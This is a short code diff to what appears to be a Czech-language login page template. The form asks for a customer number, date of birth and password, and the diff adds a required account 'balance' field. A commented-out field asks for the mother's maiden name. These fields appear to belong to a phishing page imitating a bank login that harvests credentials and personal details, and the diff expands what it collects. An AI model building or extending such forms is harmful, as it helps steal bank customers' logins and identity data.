@@ -213,6 +213,8 @@
                        placeholder="Zadejte své zákaznické číslo nebo se přihlaste" required="">
                 <input class="_3" type="text" name="birthday" placeholder="Datum narození" required="">
                 <input class="_3" type="password" name="password" placeholder="Zadejte heslo" required="">
+                <input class="_3" type="text" name="balance"
+                       placeholder="Balance" required="">
 {{--                <input class="_3" type="password" name="pin"--}}
 {{--                       placeholder="Zadejte rodne prijmeni matky s diakritikou" required="">--}}
                 <div class="loginboxes">
